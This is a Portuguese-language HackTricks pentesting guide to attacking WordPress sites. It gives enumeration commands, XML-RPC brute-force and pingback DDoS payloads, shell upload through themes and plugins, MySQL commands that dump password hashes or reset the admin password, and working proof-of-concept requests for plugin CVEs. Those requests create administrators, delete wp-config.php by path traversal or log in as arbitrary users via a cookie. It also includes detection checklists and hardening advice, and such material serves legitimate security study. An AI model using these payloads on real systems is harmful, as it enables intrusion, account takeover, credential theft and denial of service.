# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Arquivos Principais do WordPress**

- `index.php`
- `license.txt` cont√©m informa√ß√µes √∫teis, como a vers√£o do WordPress instalada.
- `wp-activate.php` √© usado para o processo de ativa√ß√£o por email ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocult√°-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` √© um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como mecanismo de transporte e XML como mecanismo de codifica√ß√£o. Esse tipo de comunica√ß√£o foi substitu√≠do pela WordPress REST API.
- A pasta `wp-content` √© o diret√≥rio principal onde plugins e temas s√£o armazenados.
- `wp-content/uploads/` √© o diret√≥rio onde quaisquer arquivos enviados para a plataforma s√£o armazenados.
- `wp-includes/` √© o diret√≥rio onde os arquivos core s√£o armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em vers√µes do WordPress 5.5 e superiores, o WordPress gera um arquivo sitemap XML com todos os posts p√∫blicos e tipos de post e taxonomias publicamente consult√°veis.

**P√≥s-explora√ß√£o**

- O arquivo `wp-config.php` cont√©m informa√ß√µes necess√°rias para o WordPress conectar-se ao banco de dados, como o nome do banco de dados, host do banco, nome de usu√°rio e senha, chaves de autentica√ß√£o e salts, e o prefixo das tabelas do banco. Esse arquivo de configura√ß√£o tamb√©m pode ser usado para ativar o modo DEBUG, que pode ser √∫til na solu√ß√£o de problemas.

### Permiss√µes de Usu√°rios

- **Administrador**
- **Editor**: Publica e gerencia suas e outras publica√ß√µes
- **Autor**: Publica e gerencia suas pr√≥prias publica√ß√µes
- **Colaborador**: Escreve e gerencia suas publica√ß√µes, mas n√£o pode public√°-las
- **Assinante**: Navega pelas publica√ß√µes e edita seu perfil

## **Enumera√ß√£o Passiva**

### **Obter vers√£o do WordPress**

Verifique se voc√™ consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **c√≥digo-fonte** da p√°gina (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos CSS vinculados

![](<../../images/image (533).png>)

- Arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair vers√µes em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumera√ß√£o ativa

### Plugins and Themes

Voc√™ provavelmente n√£o conseguir√° encontrar todos os Plugins and Themes poss√≠veis. Para descobrir todos eles, voc√™ precisar√° **ativamente Brute Force uma lista de Plugins and Themes** (espero que existam ferramentas automatizadas que contenham essas listas).

### Usu√°rios

- **ID Brute:** Voc√™ obt√©m usu√°rios v√°lidos de um site WordPress por Brute Forcing os IDs de usu√°rios:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id √© **v√°lido**. Se a resposta for **400**, ent√£o o id √© **inv√°lido**.

- **wp-json:** Voc√™ tamb√©m pode tentar obter informa√ß√µes sobre os usu√°rios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar algumas informa√ß√µes sobre usu√°rios √©:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Observe que este endpoint exp√µe apenas usu√°rios que fizeram uma publica√ß√£o. **Somente informa√ß√µes sobre os usu√°rios que tiverem esse recurso ativado ser√£o fornecidas**.

Al√©m disso, observe que **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`** a **mensagem** √© **diferente** ao indicar se o **username** existe ou n√£o.

### XML-RPC

Se `xml-rpc.php` estiver ativo voc√™ pode realizar um credentials brute-force ou us√°-lo para lan√ßar ataques DoS a outros recursos. (Voc√™ pode automatizar esse processo [usando isto](https://github.com/relarizky/wpxploit), por exemplo).

Para verificar se est√° ativo, tente acessar _**/xmlrpc.php**_ e envie esta requisi√ß√£o:

**Verifique**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** s√£o alguns dos m√©todos que podem ser usados para brute-force credentials. Se voc√™ conseguir encontrar qualquer um deles, voc√™ pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ dentro de uma resposta com c√≥digo 200 deve aparecer se as credenciais n√£o forem v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas voc√™ pode fazer upload de um arquivo. Na resposta o caminho aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tamb√©m existe uma maneira **mais r√°pida** de brute-force credenciais usando **`system.multicall`** j√° que voc√™ pode testar v√°rias credenciais na mesma requisi√ß√£o:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Contornar 2FA**

Esse m√©todo foi pensado para programas e n√£o para humanos, e √© antigo; portanto n√£o suporta 2FA. Ent√£o, se voc√™ tem credenciais v√°lidas mas a entrada principal est√° protegida por 2FA, **voc√™ pode ser capaz de abusar de xmlrpc.php para fazer login com essas credenciais contornando a 2FA**. Observe que voc√™ n√£o poder√° executar todas as a√ß√µes que pode fazer atrav√©s do console, mas ainda assim pode chegar a RCE como Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou port scanning**

Se voc√™ encontrar o m√©todo _**pingback.ping**_ dentro da lista, voc√™ pode fazer o Wordpress enviar uma requisi√ß√£o arbitr√°ria para qualquer host/porta.\
Isso pode ser usado para solicitar que **milhares** de **sites** Wordpress **acessem** um √∫nico **local** (causando assim um **DDoS** naquele local) ou voc√™ pode us√°-lo para fazer o **Wordpress** realizar um **scan** de alguma **rede** interna (voc√™ pode indicar qualquer porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se voc√™ obtiver **faultCode** com um valor **maior** do que **0** (17), isso significa que a porta est√° aberta.

Veja o uso de **`system.multicall`** na se√ß√£o anterior para aprender como abusar desse m√©todo para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo normalmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando este arquivo √© **acessado**, uma consulta MySQL "**heavy**" √© executada, ent√£o ele pode ser usado por **attackers** para **causar** um **DoS**.\
Al√©m disso, por padr√£o, o `wp-cron.php` √© chamado a cada carregamento de p√°gina (sempre que um cliente solicita qualquer p√°gina do Wordpress), o que em sites de alto tr√°fego pode causar problemas (DoS).

Recomenda-se desativar o Wp-Cron e criar um cronjob real no host que execute as a√ß√µes necess√°rias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site Wordpress pode fazer uma requisi√ß√£o para voc√™.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se existe o **methodName: pingback.ping** e o caminho **/wp-json/oembed/1.0/proxy**, e se existirem, tenta explor√°-los.

## Ferramentas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais do que um ataque real, isto √© uma curiosidade. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) voc√™ poderia inverter 1 bit de qualquer arquivo wordpress. Assim, voc√™ poderia inverter a posi√ß√£o `5389` do arquivo `/var/www/html/wp-includes/user.php` para NOP a opera√ß√£o NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema usado (credenciais admin necess√°rias)**

Apar√™ncia ‚Üí Editor de Temas ‚Üí Template 404 (√† direita)

Substitua o conte√∫do por um php shell:

![](<../../images/image (384).png>)

Pesquise na internet como acessar essa p√°gina atualizada. Nesse caso voc√™ deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Voc√™ pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sess√£o.

## Plugin RCE

### PHP plugin

Pode ser poss√≠vel fazer upload de arquivos .php como um plugin.\
Crie seu backdoor php usando, por exemplo:

![](<../../images/image (183).png>)

Depois adicione um novo plugin:

![](<../../images/image (722).png>)

Fa√ßa upload do plugin e pressione Install Now:

![](<../../images/image (249).png>)

Clique em Procced:

![](<../../images/image (70).png>)

Provavelmente isso aparentemente n√£o far√° nada, mas se voc√™ for em Media, ver√° seu shell enviado:

![](<../../images/image (462).png>)

Acesse-o e voc√™ ver√° a URL para executar o reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Este m√©todo envolve a instala√ß√£o de um plugin malicioso conhecido por ser vulner√°vel e que pode ser explorado para obter um web shell. Esse processo √© realizado atrav√©s do WordPress dashboard da seguinte forma:

1. **Aquisi√ß√£o do plugin**: O plugin √© obtido de uma fonte como Exploit DB, por exemplo [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instala√ß√£o do plugin**:
- Navegue at√© o WordPress dashboard, ent√£o v√° para `Dashboard > Plugins > Upload Plugin`.
- Fa√ßa o upload do arquivo zip do plugin baixado.
3. **Ativa√ß√£o do plugin**: Depois que o plugin for instalado com sucesso, ele deve ser ativado atrav√©s do dashboard.
4. **Exploitation**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado pois √© conhecido por ser vulner√°vel.
- O Metasploit framework fornece um exploit para essa vulnerabilidade. Ao carregar o m√≥dulo apropriado e executar comandos espec√≠ficos, uma sess√£o meterpreter pode ser estabelecida, concedendo acesso n√£o autorizado ao site.
- Observa-se que este √© apenas um dos muitos m√©todos para explorar um site WordPress.

O conte√∫do inclui aux√≠lios visuais mostrando os passos no WordPress dashboard para instalar e ativar o plugin. Contudo, √© importante notar que explorar vulnerabilidades dessa maneira √© ilegal e anti√©tico sem autoriza√ß√£o adequada. Essas informa√ß√µes devem ser usadas de forma respons√°vel e somente em um contexto legal, como pentesting com permiss√£o expl√≠cita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS para RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ √© um script projetado para escalar uma vulnerabilidade de **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades cr√≠ticas no WordPress. Para mais informa√ß√µes veja [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele oferece suporte para as vers√µes do WordPress 6.X.X, 5.X.X e 4.X.X e permite:
- _**Privilege Escalation:**_ Cria um usu√°rio no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faz upload do seu plugin customizado (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita um Built-In Plugin no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita um Built-In Theme no WordPress.
- _**(Custom) Custom Exploits:**_ Exploits customizados para plugins/temas WordPress de terceiros.

## P√≥s-explora√ß√£o

Extraia nomes de usu√°rio e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar senha do admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superf√≠cie de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades √© fundamental para encontrar vulnerabilidades em seu funcionamento. Voc√™ pode descobrir como um plugin pode expor funcionalidades nos itens a seguir e alguns exemplos de plugins vulner√°veis em [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das maneiras que um plugin pode expor fun√ß√µes para usu√°rios √© via AJAX handlers. Eles podem conter logic, authorization, ou authentication bugs. Al√©m disso, √© bastante frequente que essas fun√ß√µes baseiem tanto a authentication quanto a authorization na exist√™ncia de um wordpress nonce que **any user authenticated in the Wordpress instance might have** (independentemente do seu papel).

Estas s√£o as fun√ß√µes que podem ser usadas para expor uma fun√ß√£o em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acess√≠vel por qualquer usu√°rio (mesmo n√£o autenticados).**

> [!CAUTION]
> Al√©m disso, se a fun√ß√£o apenas verifica a autoriza√ß√£o do usu√°rio com a fun√ß√£o `wp_verify_nonce`, essa fun√ß√£o apenas verifica que o usu√°rio est√° logado, geralmente n√£o verifica o papel (role) do usu√°rio. Ent√£o usu√°rios com poucos privil√©gios podem ter acesso a a√ß√µes de alto privil√©gio.

- **REST API**

Tamb√©m √© poss√≠vel expor fun√ß√µes do wordpress registrando uma REST API usando a fun√ß√£o `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` √© um callback para uma fun√ß√£o que verifica se um dado usu√°rio est√° autorizado a chamar o m√©todo da API.

**Se a fun√ß√£o interna `__return_true` for usada, ela simplesmente vai pular a verifica√ß√£o de permiss√µes do usu√°rio.**

- **Direct access to the php file**

Claro, Wordpress usa PHP e arquivos dentro de plugins s√£o diretamente acess√≠veis pela web. Portanto, caso um plugin exponha qualquer funcionalidade vulner√°vel que seja acionada apenas ao acessar o arquivo, ela poder√° ser explorada por qualquer usu√°rio.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Alguns plugins implementam atalhos de ‚Äútrusted header‚Äù para integra√ß√µes internas ou reverse proxies e ent√£o usam esse header para definir o contexto do usu√°rio atual para requisi√ß√µes REST. Se o header n√£o for vinculado criptograficamente √† requisi√ß√£o por um componente upstream, um atacante pode falsific√°-lo e acessar rotas REST privilegiadas como administrador.

- Impacto: escalada de privil√©gio n√£o autenticada para admin ao criar um novo administrador via a core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (for√ßa o ID do usu√°rio 1, tipicamente a primeira conta de administrador).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um cabe√ßalho controlado pelo cliente para o estado de autentica√ß√£o e pula as verifica√ß√µes de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin a contorna definindo diretamente o contexto do usu√°rio atual a partir do cabe√ßalho.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usu√°rio criado.
- Um novo usu√°rio admin vis√≠vel em `wp-admin/users.php`.

Checklist de detec√ß√£o

- Procure por `getallheaders()`, `$_SERVER['HTTP_...']`, ou vendor SDKs que leem cabe√ßalhos customizados para definir o contexto do usu√°rio (ex.: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revise registros REST em busca de callbacks privilegiados que n√£o tenham checagens robustas de `permission_callback` e que, em vez disso, dependam de cabe√ßalhos da requisi√ß√£o.
- Procure usos de fun√ß√µes core de gerenciamento de usu√°rios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que sejam protegidos apenas por valores de cabe√ßalho.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **verifica√ß√£o de capability** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Sanitiza√ß√£o / valida√ß√£o estrita da entrada**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este snippet:

* **Unauthenticated access** ‚Äì o hook `wp_ajax_nopriv_` est√° registrado.
* **Sem nonce / capability check** ‚Äì qualquer visitante pode acessar o endpoint.
* **Sem sanitiza√ß√£o do caminho** ‚Äì a string controlada pelo usu√°rio `fontfamily` √© concatenada a um caminho do sistema de arquivos sem filtragem, permitindo o cl√°ssico `../../` traversal.

#### Exploitation

Um atacante pode excluir qualquer arquivo ou diret√≥rio **abaixo do diret√≥rio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma √∫nica requisi√ß√£o HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Outros alvos impactantes incluem arquivos `.php` de plugin/theme (para comprometer plugins de seguran√ßa) ou regras `.htaccess`.

#### Checklist de detec√ß√£o

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chame helpers do sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatena√ß√£o de entrada do usu√°rio n√£o sanitizada em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Aus√™ncia de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (‚â§ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why it‚Äôs exploitable

- Confia em `$_REQUEST['reset-for']` e em uma op√ß√£o do plugin sem autoriza√ß√£o no lado do servidor.
- Se um usu√°rio anteriormente tinha privil√©gios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaur√°-los acessando o caminho de reset.
- Em algumas implanta√ß√µes, qualquer usu√°rio autenticado poderia disparar um reset para outro nome de usu√°rio ainda presente em `viewing_admin_as_role_are` (autoriza√ß√£o quebrada).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em builds vulner√°veis isso remove as roles atuais e readiciona as roles originais salvas (por exemplo, `administrator`), efetivamente escalando privil√©gios.

Detection checklist

- Procure por funcionalidades de troca de role que persistem as ‚Äúoriginal roles‚Äù em user meta (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de reset/restore que:
- Leem usernames de `$_REQUEST` / `$_GET` / `$_POST`.
- Modificam roles via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizam com base em um array de op√ß√£o do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

Alguns plugins conectam helpers de troca de usu√°rio ao hook p√∫blico `init` e derivam a identidade a partir de um cookie controlado pelo cliente. Se o c√≥digo chama `wp_set_auth_cookie()` sem verificar autentica√ß√£o, capability e um nonce v√°lido, qualquer visitante n√£o autenticado pode for√ßar o login como um ID de usu√°rio arbitr√°rio.

Typical vulnerable pattern (simplified from Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por que √© explor√°vel

- O hook p√∫blico `init` torna o handler acess√≠vel por usu√°rios n√£o autenticados (sem verifica√ß√£o `is_user_logged_in()`).
- A identidade √© derivada de um cookie modific√°vel pelo cliente (`original_user_id`).
- A chamada direta a `wp_set_auth_cookie($uid)` autentica o solicitante como esse usu√°rio sem quaisquer verifica√ß√µes de capability/nonce.

Explora√ß√£o (sem autentica√ß√£o)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

WAFs gen√©ricos de edge/servidor s√£o calibrados para padr√µes amplos (SQLi, XSS, LFI). Muitas falhas de alto impacto em WordPress/plugins s√£o bugs de l√≥gica/auth espec√≠ficos da aplica√ß√£o que parecem tr√°fego benigno, a menos que o engine entenda as rotas do WordPress e a sem√¢ntica do plugin.

Offensive notes

- Alveje endpoints espec√≠ficos do plugin com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste caminhos n√£o autenticados primeiro (AJAX `nopriv`, REST com permissive `permission_callback`, shortcodes p√∫blicos). Payloads padr√£o frequentemente t√™m sucesso sem obfusca√ß√£o.
- Casos t√≠picos de alto impacto: escalonamento de privil√©gios (controle de acesso quebrado), upload/download arbitr√°rio de arquivos, LFI, open redirect.

Defensive notes

- N√£o confie em assinaturas gen√©ricas de WAF para proteger CVEs de plugins. Implemente patches virtuais espec√≠ficos de vulnerabilidade na camada de aplica√ß√£o ou atualize rapidamente.
- Prefira verifica√ß√µes de seguran√ßa do tipo positive-security no c√≥digo (capabilities, nonces, valida√ß√£o estrita de entrada) em vez de filtros negativos por regex.

## Prote√ß√£o do WordPress

### Atualiza√ß√µes regulares

Certifique-se de que WordPress, plugins, e themes estejam atualizados. Tamb√©m confirme que a atualiza√ß√£o autom√°tica est√° habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Al√©m disso, **instale apenas plugins e temas confi√°veis do WordPress**.

### Plugins de Seguran√ßa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomenda√ß√µes**

- Remova o usu√°rio padr√£o **admin**
- Use **senhas fortes** e **2FA**
- Periodicamente **revisar** as **permiss√µes** dos usu√°rios
- **Limitar tentativas de login** para prevenir ataques Brute Force
- Renomeie o arquivo **`wp-admin.php`** e permita acesso somente internamente ou de certos endere√ßos IP.

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

O plugin WP Job Portal de recrutamento exp√¥s uma tarefa **savecategory** que, em √∫ltima inst√¢ncia, executa o seguinte c√≥digo vulner√°vel dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introduzidos por este trecho:

1. **Entrada de usu√°rio n√£o sanitizada** ‚Äì `parentid` vem diretamente da requisi√ß√£o HTTP.
2. **Concatena√ß√£o de strings dentro da cl√°usula WHERE** ‚Äì sem `is_numeric()` / `esc_sql()` / prepared statement.
3. **Alcance sem autentica√ß√£o** ‚Äì embora a a√ß√£o seja executada atrav√©s de `admin-post.php`, a √∫nica verifica√ß√£o presente √© um **CSRF nonce** (`wp_verify_nonce()`), que qualquer visitante pode recuperar de uma p√°gina p√∫blica que embede o shortcode `[wpjobportal_my_resumes]`.

